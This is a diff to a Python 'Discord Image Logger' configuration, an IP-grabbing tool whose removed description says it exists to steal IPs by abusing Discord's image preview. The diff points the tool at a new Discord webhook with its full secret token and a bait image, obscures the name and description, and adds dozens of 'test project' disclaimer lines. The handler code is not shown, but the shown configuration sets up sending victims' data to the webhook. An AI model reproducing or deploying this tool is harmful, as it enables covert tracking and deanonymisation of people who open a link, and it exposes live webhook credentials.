@@ -1,24 +1,68 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
+# THIS IS TEST PROJECT DONT TRY
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord 1mage L0gg3r"
+__description__ = "COKZORYUA"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1344767938216984636/Aau5Nc3JbmJ8Owkx6TM07BgXi7u0cZ1nkrpSUMS6FSN9u7OXe3SIMTpLJ1ttQxvg4UXf",
-    "image": "https://cdn.discordapp.com/attachments/1241845476693905468/1344748279036116992/image.png?ex=67c209ed&is=67c0b86d&hm=7dcc68a77df0fbd2421bdb3e113e23ac85b8f2b57a86349dc1af1ab4751fce3d&", # You can also have a custom image by using a URL argument
+    "webhook": "https://ptb.discord.com/api/webhooks/1345854411024633988/NKMRh8BWiFg80XmE7WSJTGBHENTZekUZTaHps97DVdkro8PpBnj3f3doD-vNFavqK3M2",
+    "image": "https://cdn.discordapp.com/attachments/1345853939966283800/1345854993357344789/Adsz.png?ex=67c610a3&is=67c4bf23&hm=ebc9833c8f10b5fe6298d5988a4bbcf84aa3c9db49718a2d34c46c88efef2640&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Test Project", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +72,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "top tufeksiz", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
